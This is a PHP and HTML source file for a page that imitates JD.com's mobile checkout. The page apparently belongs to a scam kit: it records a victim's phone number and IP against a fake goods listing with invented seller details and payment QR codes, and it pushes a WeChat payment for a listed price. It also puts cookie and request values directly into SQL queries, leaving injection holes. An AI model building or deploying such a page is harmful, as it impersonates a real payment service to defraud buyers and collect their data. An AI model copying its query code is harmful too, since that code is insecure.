
<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');

$xzshijian=date('Y-m-d H:i:s', time());
$wwid=$_REQUEST['a'];
$ip=getIP();

$tel889=$_REQUEST['tel'];
$tel889=str_ireplace("src","",$tel889);
$tel889=str_ireplace("script","",$tel889);

setcookie('tel889',$tel889);

if($_COOKIE['GoodsID4']){
	$_GoodsID = _fetch_array("SELECT
									goods_class.gclass_id,
									goods_class.gc_name,
									goods_class.gc_type,
									goods_class.web_name,
									goods_class.jump_url,
									goods_class.web_logo,
									goods_class.web_name2,
									goods.goods_id,
									goods.title,
									goods.price,
									goods.freight,
									goods.region,
									goods.goods_desc,
									goods.test_desc,
									goods.hits,
									goods.stock,
									goods.doods_num,
									goods.tran_num,
									goods.recovery_rate,
									goods.user_portrait,
									goods.user_name,
									goods.user_gender,
									goods.user_grade,
									goods.att_capacity,
									goods.att_color,
									goods.att_channel,
									goods.weixin_img,
									goods.zhifubao_img,
									goods.goods_img1,
									goods.goods_img2,
									goods.goods_img3,
									goods.goods_img4,
									goods.goods_img5,
									goods.test_desc2,
									goods.is_shelves,
									goods.oldnew,
									goods.in_admin_id,
									goods.in_class_id,
									goods.imUrl,
									goods.add_time,
									goods.zhifubaoURL,
									goods.wxURL,
									goods.pay_fangshi,
									goods.goods_oid
								FROM
									goods_class
								INNER JOIN goods ON goods_class.gclass_id = goods.in_class_id 
								WHERE goods_id='{$_COOKIE['GoodsID4']}'") or die('SQL执行错误');


}
if($_COOKIE['GoodsID4']){
	
    //存在就更新此数据状态为3地址页和时间
	$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}' AND gid='{$_COOKIE['GoodsID4']}'");
	
	if($_OID){
		_query("
			UPDATE 
				useraddress
			SET 
				state=4,
				utel='{$tel889}',
				utime='{$xzshijian}'
			WHERE 
				uip='{$ip}' LIMIT 1") or die(mysql_error());
		  _close();
		  session_destroy();
	}
	
	
	
	if(!$_GoodsID){
       header('Location:'. htmlspecialchars_decode($_GoodsID['jump_url']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($_GoodsID['jump_url']).'');
}

?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="format-detection" content="telephone=no">
        <title>京东收银台</title>
        <script type="text/javascript">
            var pin;            
            var rTimeArr = [];
            rTimeArr[0] = {time : new Date()};
            document.addEventListener("DOMContentLoaded",function(){
                rTimeArr[1] = {time : new Date() , sTime : "0"};
            });
        </script>
        <link rel="stylesheet" type="text/css" href="./img/ariel-all.min-98ac573c4729ee580e10b9f2ee575740.css">
        <link rel="stylesheet" type="text/css" href="./img/newpay-home.min-7edcb4b068665f127725e1df61f72e12.css">
       
	   
	   
	   
	   
	   
    <script type="text/javascript" src="./img/m_common2.1.js"></script><script type="text/javascript" src="./img/m_common_header_bottom2.1.js"></script><script src="./img/reporttime.min.js" type="text/javascript"></script><link rel="stylesheet" type="text/css" charset="utf-8" href="./img/header.css"><script src="./img/jdwebm.js"></script><script async="" src="./img/gatherInfo.js"></script></head>
    <body class="body-iOS body-android">
		
		<style type="text/css">#weixin-tip{display: none; position: fixed; left:0; top:0; background:#333; filter:alpha(opacity=80); width: 100%; height:100%; z-index: 100;} #weixin-tip p{text-align: center; margin-top: 10%; padding:0 5%;}
		
		</style>
		<div id="weixin-tip"><p><img src="./img/live_weixinqq.png" width="100%" alt="微信打开"></p></div>
		
		<script src="./img/jquery.js"></script>
		 
		<script type="text/javascript">
		 
			
			               
			       function is_weixin() {
					    var ua = navigator.userAgent.toLowerCase();
					    if (ua.match(/MicroMessenger/i) == "micromessenger") {
					        return true;
					    } else {
					        return false;
					    }
					}
					var isWeixin = is_weixin();
					var winHeight = typeof window.innerHeight != 'undefined' ? window.innerHeight : document.documentElement.clientHeight;
				 
					
					 
				   
					if(isWeixin){
						$("#weixin-tip").show();
					}
		</script>
		
		
		
		
		
		
        <div id="viewport">
            <div id="m_common_header"><header class="jd-header"><div class="jd-header-new-bar">
              <div onclick="window.open('dd.php','_self')" report-eventid="MCommonHead_Back" report-eventparam="https://pay.m.jd.com/cpay/newPay-index.html" id="m_common_header_goback" class="jd-header-icon-back J_ping"><span></span></div><div class="jd-header-new-title">京东收银台</div><div report-eventid="MCommonHead_NavigateButton" report-eventparam="https://pay.m.jd.com/cpay/newPay-index.html" id="m_common_header_jdkey" class="jd-header-icon-new-shortcut J_ping"><span></span></div></div></header></div>
            <div class="order-bar-wrap" style="display: block;">
                <div class="home-notice-wrap">
                </div>
                <div class="mobile-bar">
                    <span class="mobile-title">充值号码</span>
                    <span class="mobile-number"></span>
                </div>
                <div class="order-bar new-order-bar">
                    <div class="pay-total" role="text" aria-label="">
                        <strong class="JS-pay-total" aria-hidden="true"><span class="JS-pay-total-icon">¥</span><span class="total1"><?php echo $_GoodsID['price'];?></span>.<em class="total2">00</em></strong>
                    </div>
                    <div class="subTitle"></div>
                    <div class="installments-container u-hide"></div>
                    <div class="JS-pay-tip pay-tip new-pay-tip"></div>
                </div>
            </div>
                
            <div class="JS-page-ct page-ct  position-change" style="height: 755px;">
                <div class="JS-page-scorller" style="transition-timing-function: cubic-bezier(0.1, 0.57, 0.1, 1); transition-duration: 0ms; transform: translate(0px) translateZ(0px); display: block;">
                    <div class="new-pay-bar-container">
                        <div class="new-pay-bar">
                            <h2 class="p-title-bar p-pay-title-bar" aria-hidden="false" aria-label="京东支付" role="heading"></h2>
                        </div>
                        <div class="new-pay-disabled">
                            <div class="new-pay-disabled-icon"></div>
                            <span class="new-pay-disabled-text">京东支付暂不可用</span>
                        </div>
                    </div>
                    <ul class="list pay-list jd-pay-list" style="display: block;"><li class="list-item list-link-item pay-list-item jdpay-list-item jd-cart-pay jdPayment" style="height: auto; display: list-item;"><a href="javascript:void(0);" class="pay-list-link no-border" role="option" aria-selected="false"><span class="pay-icon" style="background-image: url(static/images/bankcard1.png&quot;);"></span><span class="title-main accessbility_bank" role="text">使用新卡支付</span></a></li></ul>  
                    <!-- <a href="javascript:void(0);" class="p-jd-switch"><span class="p-jd-switch-pays"></span><span class="p-jd-switch-icon"></span></a>               -->
                    <a href="javascript:void(0);" class="p-all-switch" role="link" aria-label="全部付款方式" style="display: block;">
                        <span class="p-jd-switch-title" aria-hidden="true">全部付款方式</span>
                        <span class="p-jd-switch-pays" aria-hidden="true">查看</span>
                        <span class="p-jd-switch-icon" aria-hidden="true"></span>
                    </a>
                    <!-- <a href="javascript:void(0);" class="p-jd-switch"><span class="p-jd-switch-title">其他付款方式</span><span class="p-jd-switch-pays"></span><span class="p-jd-switch-icon"></span></a>               -->
                    <div class="pay-list-block"></div>
                    <ul class="list pay-list p-other-pay-list" style="display: block;"><li class="list-item list-link-item pay-list-item other-pay-list-item pay-has-vice weixin-pay otherPayment selected" style="display: list-item;"><a href="javascript:void(0);" class="pay-list-link" role="option" aria-selected="true"><span class="pay-icon"></span><span class="title-main title-main-hasvice">微信支付</span><span class="title-vice">仅安装微信6.0.2 及以上版本客户端使用</span></a></li></ul>       
                    <div class="PAY_SCROLL_LEFT PAY_SCROLL_LEFT-M"></div>
                </div>
            </div>
            <div class="newPay-btn-container" style="display: block;">
                <a href="go.php" class="btn pay-next confirm-pay">微信支付¥<?php echo $_GoodsID['price'];?>.00</a>
            </div>
        <div class="choose-card-Layer-wrap pay-index js-jd-payment" aria-hidden="true">    <h6 class="layer-title choose-card-Layer-title">付款方式</h6>    <a href="javascript:void(0);" class="choose-card-Layer-close right-close" role="button" aria-label="关闭谈窗"></a>    <div class="card-list-scroll-wrap"><div class="layer-list card-list"><a href="javascript:void(0);" class="layer-list-item can-use {$tips} card-list-item js-card-list-item-card crl-radio checked pr" data-card-li="0" role="option" aria-selected="true">   <img class="layer-bank-image" src="./img/ccb.png" alt="">   <div class="layer-bank-name"><p class="bank-name-title">建设银行储蓄卡</p></div></a><a href="javascript:void(0);" class="layer-list-item can-use {$tips} card-list-item js-card-list-item-card crl-radio crl-arrow pr" data-card-li="1" role="option" aria-selected="false">   <img class="layer-bank-image" src="./img/bankcard1.png" alt="">   <div class="layer-bank-name"><p class="bank-name-title">使用新卡支付</p></div></a><a href="javascript:void(0);" class="layer-list-item can-use {$tips} card-list-item js-card-list-item-card crl-radio crl-arrow pr" data-card-li="2" role="option" aria-selected="false">   <img class="layer-bank-image" src="./img/boc.png" alt="">   <div class="layer-bank-name"><p class="bank-name-title">首次添加中国银行信用卡<span class="bank-name-preferential">满12.01减12元</span></p></div></a><a href="javascript:void(0);" class="layer-list-item can-use {$tips} card-list-item js-card-list-item-card crl-radio crl-arrow pr" data-card-li="3" role="option" aria-selected="false">   <img class="layer-bank-image" src="./img/ceb.png" alt="">   <div class="layer-bank-name"><p class="bank-name-title">首次添加光大银行信用卡<span class="bank-name-preferential">满15.01减12元</span></p></div></a><a href="javascript:void(0);" class="layer-list-item can-use {$tips} card-list-item js-card-list-item-card crl-radio crl-arrow pr" data-card-li="4" role="option" aria-selected="false">   <img class="layer-bank-image" src="./img/cmb.png" alt="">   <div class="layer-bank-name"><p class="bank-name-title">首次添加招商银行借记卡<span class="bank-name-preferential">立减6.6元</span></p></div></a><a href="javascript:void(0);" class="layer-list-item can-use {$tips} card-list-item js-card-list-item-card crl-radio crl-arrow pr" data-card-li="5" role="option" aria-selected="false">   <img class="layer-bank-image" src="./img/bob.png" alt="">   <div class="layer-bank-name"><p class="bank-name-title">首次添加北京银行信用卡<span class="bank-name-preferential">满10.01减10元</span></p></div></a><a href="javascript:void(0);" class="layer-list-item cant-use hasTips card-list-item js-card-list-item-card crl-radio pr" data-card-li="6" role="option" aria-selected="false">   <img class="layer-bank-image" src="./img/baitiao_2.0.png" alt="">   <div class="layer-bank-name"><p class="bank-name-title has-tip">打白条</p><p class="bank-name-tip">请设置数字支付密码后使用</p></div></a></div></div></div></div><div class="preload-image"></div><div class="preload-image"></div>
        <script type="text/javascript">rTimeArr[3] = {sTime : new Date()};</script>
        <script>
            // i标识匹配的时候不区分大小写，极速版app ua标识为jdltapp
            window.isliteApp = false;
            if (navigator.userAgent.toLowerCase().match(/jdltapp/i)=="jdltapp") {
                window.isliteApp = true;
                window.jap = {
                    siteId : 'JA2020_2532596' //极速版站点编号，必传字段
                }
            }else{
                window.jap = {
                    siteId : 'JA2020_4112831', //非极速版上报
                    autoLogPv : true,
                };
            }
        </script>
		
		
        <script type="text/javascript" src="./img/unify.min.js"></script>
        <script type="text/javascript">rTimeArr[3].time = new Date();</script>
        <script type="text/javascript" src="https://js.users.51.la/20885247.js"></script>
        <script type="text/javascript" src="./img/jsencrypt.min-2c73f0caf1f64f8258191d30a262974c.js"></script>

        <script type="text/javascript" src="./img/newpay-index.min-af5b12972b274e236360e2cfbdc757f8.js"></script>
        
        <script type="text/javascript">
            rTimeArr[4] = {time : new Date() , sTime : "3"};
            try{                
                $(function(){
                    var payPage = new PayPage();
                });
            }catch(e){
                try{
                    var click = new MPing.inputs.Click('JDcheckout_UnableToLoad');
                    click.page_name=window.location.pathname;
                    var mping = new MPing();
                    mping.send(click);
                }catch(e){} 
                try{// x5内核近期版本typeof($)会报错
                    if(typeof($)=='undefined'){
                        var url=window.location.href;
                        if(url.indexOf('/cpay/')>=0){
                            url=url.replace('/cpay/','/pay/');                        
                            setTimeout(function(){
                                window.location.href=url;
                            },50);
                        }
                    }
                }catch(e){
                    var url=window.location.href;
                    if(url.indexOf('/cpay/')>=0){
                        url=url.replace('/cpay/','/pay/');                        
                        setTimeout(function(){
                            window.location.href=url;
                        },50);
                    }
                }
            }
        </script>
        <script src="./img/boomerang.min.js"></script>
        <script type="text/javascript">
            var enableBoomer = window.location.hostname!=="localhost" && window.location.hostname!=="127.0.0.1";
            try{
                BOOMR.init({
                    siteid: "JA2020_4112831",
                    autorun: enableBoomer,
                    log: null,
                    History: {
                        auto: enableBoomer
                    },
                    Errors: {
                        monitorGlobal: enableBoomer,
                        monitorNetwork: enableBoomer,
                        monitorConsole: enableBoomer,
                        monitorEvents: enableBoomer,
                        monitorTimeout: enableBoomer
                    }
                });
            }catch(error){

            }
        </script>
    
</body></html>